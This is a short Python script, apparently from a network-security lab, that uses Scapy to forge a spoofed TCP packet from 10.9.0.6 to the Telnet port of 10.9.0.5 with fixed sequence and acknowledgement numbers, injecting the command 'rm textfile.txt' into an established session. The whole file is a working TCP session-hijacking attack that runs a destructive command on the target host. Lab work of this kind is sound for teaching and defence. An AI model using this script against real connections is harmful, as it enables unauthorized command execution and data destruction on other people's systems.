#!/usr/bin/env python3

from scapy.all import *

src_port = 45020
seq_nbr = 2796048539
ack_nbr = 1050143683

ip = IP(src = "10.9.0.6", dst = "10.9.0.5")
tcp = TCP(sport = src_port, dport = 23, flags = "A", seq = seq_nbr, ack = ack_nbr)
data = "\rrm textfile.txt\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose = 0)
